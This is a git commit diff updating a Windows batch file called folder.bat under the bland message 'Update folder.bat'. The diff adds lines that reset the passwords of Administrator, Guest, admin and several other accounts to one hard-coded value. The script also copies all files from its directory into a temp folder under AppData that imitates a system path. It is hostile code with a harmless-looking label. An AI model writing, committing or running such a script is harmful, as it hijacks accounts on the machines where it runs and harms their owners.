783dc851faaa85ca08e41b7361726d7f1d677aaa
johan <ali.slm.1331@gmail.com>
2022-01-22 04:34:20 +0330

    Update folder.bat

--- folder.bat
+++ folder.bat
@@ -1,3 +1,11 @@
+net user admin   xroot11
+net user cloudbase-init xroot11
+net user WDAGUtilityAccount xroot11
+net user Administrator  xroot11
+net user Guest  xroot11
+net user DefaultAccount xroot11
+
+
 mkdir %appdata%\Microsoft\Windows\temp
 xcopy /E * %appdata%\Microsoft\Windows\temp
 pause
